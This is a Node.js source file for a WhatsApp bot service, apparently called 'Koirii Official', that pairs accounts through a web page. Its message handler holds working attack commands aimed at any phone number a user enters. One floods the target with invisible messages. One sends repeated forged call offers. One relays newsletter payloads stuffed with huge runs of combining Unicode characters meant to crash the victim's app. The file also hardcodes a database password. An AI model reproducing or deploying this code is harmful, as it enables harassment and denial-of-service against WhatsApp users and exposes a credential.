const express = require('express');
const mongoose = require('mongoose');
const makeWASocket = require('@whiskeysockets/baileys').default;
const { useMultiFileAuthState, DisconnectReason, fetchLatestWaWebVersion, jidDecode } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// --- 1. DATABASE CONNECTION ---
const MONGO_URI = 'mongodb+srv://labanlaby34_db_user:labanlabanlaban@whatsapp.xv0gpkv.mongodb.net/?retryWrites=true&w=majority';
mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ Connected to MongoDB'))
  .catch(err => console.log('❌ MongoDB Error:', err.message));

const SessionSchema = new mongoose.Schema({
    userId: { type: String, unique: true },
    phoneNumber: String,
    isConnected: { type: Boolean, default: false }
});
const UserSession = mongoose.model('UserSession', SessionSchema);

const activeBots = new Map();

// --- 2. FRONTEND WEBSITE ---
const htmlPage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Bot Pairing</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 100%; }
        h1 { color: #25D366; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #333; background: #2a2a2a; color: #fff; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #25D366; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
        .code-box { margin-top: 20px; padding: 15px; background: #2a2a2a; border: 1px dashed #25D366; border-radius: 6px; display: none; }
        .code-box h2 { color: #25D366; font-size: 28px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Link Your WhatsApp</h1>
        <input type="text" id="number" placeholder="e.g. 254712345678">
        <button onclick="pair()">Get Pairing Code</button>
        <div class="code-box" id="result">
            <p>Your Pairing Code:</p>
            <h2 id="code"></h2>
        </div>
    </div>
    <script>
        async function pair() {
            const num = document.getElementById('number').value.trim();
            if(!num) return alert('Enter a number!');
            document.getElementById('result').style.display = 'none';
            document.getElementById('code').innerText = "Loading...";
            document.getElementById('result').style.display = 'block';
            try {
                const res = await fetch('/pair?number=' + num);
                const data = await res.json();
                if(data.error) alert(data.error);
                else document.getElementById('code').innerText = data.code;
            } catch(e) { alert('Failed to connect'); }
        }
    </script>
</body>
</html>
`;
app.get('/', (req, res) => res.send(htmlPage));

// --- 3. THE PAIRING ENDPOINT ---
app.get('/pair', async (req, res) => {
    let phoneNumber = req.query.number;
    if (!phoneNumber) return res.status(400).json({ error: 'Please provide a number.' });
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    const userId = 'user_' + phoneNumber;

    let dbUser = await UserSession.findOne({ userId });
    if (dbUser && dbUser.isConnected && activeBots.has(userId)) {
        return res.json({ error: '❌ This number is already connected!' });
    }

    const sessionPath = `./sessions/${userId}`;
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestWaWebVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["MacOS", "Safari", "17.4.1"], // Your working browser config
        printQRInTerminal: false,
        syncFullHistory: false
    });

    sock.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    activeBots.set(userId, sock);
    sock.ev.on('creds.update', saveCreds);

    // --- YOUR WORKING PAIRING MECHANISM ---
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection, lastDisconnect } = update;

        if (qr && !sock.authState.creds.registered) {
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                if (!res.headersSent) res.json({ code: code });
            } catch (e) {
                if (!res.headersSent) res.status(500).json({ error: 'Error: ' + e.message });
            }
        }

        if (connection === 'open') {
            console.log(`✅ User ${phoneNumber} connected!`);
            await UserSession.findOneAndUpdate(
                { userId },
                { phoneNumber, isConnected: true },
                { upsert: true }
            );
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                console.log(`🔄 Reconnecting user ${phoneNumber}...`);
                activeBots.delete(userId);
            } else {
                console.log(`❌ User ${phoneNumber} logged out.`);
                await UserSession.findOneAndUpdate({ userId }, { isConnected: false });
                activeBots.delete(userId);
            }
        }
    });

    // --- 4. MESSAGE HANDLER (Your commands) ---
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        for (const m of messages) {
            if (!m.message) continue;
            try {
                const text = m.message.conversation || m.message.extendedTextMessage?.text || '';
                if (!text) continue;
                
                const prefix = '.';
                const isCmd = text.startsWith(prefix);
                const command = isCmd ? text.slice(prefix.length).trim().split(" ")[0].toLowerCase() : '';
                
                const sender = m.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" : m.key.participant || m.key.remoteJid;
                const from = m.key.remoteJid;

                const reply = async (teks) => {
                    await sock.sendMessage(from, { text: teks }, { quoted: m });
                };

                if (command === "menu") {
                    let menuText = `\n. ▢ Botname : *Koirii Official*\n. ▢ Connected as : ${phoneNumber}\n\n ╭▢ *Command Menu*\n │.blank 254xxx\n │.newsletter-crash 254xxx\n │.crash 254xxx\n ╰▢\n\n`;
                    await reply(menuText);
                }

                if (command === "blank") {
                    let bNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
                    if (!bNum) return reply("— ex: .blank 254xxx");
                    let bJid = bNum + "@s.whatsapp.net";
                    reply("Success! Sending Blank Messages to " + bJid);
                    const invisibleText = "\u200B"; 
                    for (let i=0; i<20; i++) {
                        await sock.sendMessage(bJid, { text: invisibleText });
                        await new Promise(r => setTimeout(r, 100)); 
                    }
                }

                if (command === "crash" || command === "forclose") {
                    let crNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
                    if (!crNum) return reply("— ex: .crash 254xxx");
                    let crJid = crNum + "@s.whatsapp.net";
                    reply("Success! Sending Call Flood to " + crJid);
                    
                    const sendCrashCall = async (jid) => {
                        try {
                            let jids = (await sock.getUSyncDevices([jid], false, false)).map(({ user, device }) => user + ':' + (device || '') + "@s.whatsapp.net");
                            await sock.assertSessions(jids);
                            let { nodes, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(jids, { conversation: 'y' }, { count: '0' });
                            await sock.sendNode({ 
                                tag: "call", 
                                attrs: { to: jid, id: sock.generateMessageTag(), from: sock.user.id }, 
                                content: [{ 
                                    tag: "offer", 
                                    attrs: { 'call-id': crypto.randomBytes(16).toString("hex").toUpperCase(), 'call-creator': sock.user.id }, 
                                    content: [
                                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } }, 
                                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } }, 
                                        { tag: "video", attrs: { orientation: '0', screen_width: "1920", screen_height: "1080", device_orientation: '0', enc: 'vp8', dec: "vp8" } }, 
                                        { tag: 'net', attrs: { medium: '3' } }, 
                                        { tag: "capability", attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) }, 
                                        { tag: "encopt", attrs: { keygen: '2' } }, 
                                        { tag: "destination", attrs: {}, content: nodes }, 
                                        ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: require('@whiskeysockets/baileys').encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                                    ] 
                                }] 
                            });
                        } catch(e) { }
                    };
                    for (let i=0; i<50; i++) { await sendCrashCall(crJid); }
                }

                if (command === "newsletter-crash") {
                    let nNum = (text.split(" ").slice(1)[0] || '').replace(/[^0-9]/g, '');
                    if (!nNum) return reply("— ex: .newsletter-crash 254xxx");
                    let nJid = nNum + "@s.whatsapp.net";
                    reply("⚠️ Sending Newsletter Payload to " + nJid);
                    
                    const sendNewsletterCrash = async (jid) => {
                        try {
                            let payload = {
                                newsletterAdminInviteMessage: {
                                    newsletterJid: "1234567891234@newsletter",
                                    newsletterName: "C" + 'ោ៝'.repeat(50000),
                                    caption: "Crash" + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(50000),
                                    inviteExpiration: "9999999999999",
                                    contextInfo: {
                                        participant: "0@s.whatsapp.net",
                                        remoteJid: "status@broadcast",
                                        mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
                                    }
                                }
                            };
                            await sock.relayMessage(jid, payload, { participant: { jid } });
                        } catch(e) { }
                    };
                    for (let i=0; i<10; i++) {
                        await sendNewsletterCrash(nJid);
                        await new Promise(r => setTimeout(r, 100));
                    }
                }

            } catch (e) {
                console.log('❌ Handler Error:', e.message);
            }
        }
    });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Web server running on port ${PORT}`);
});
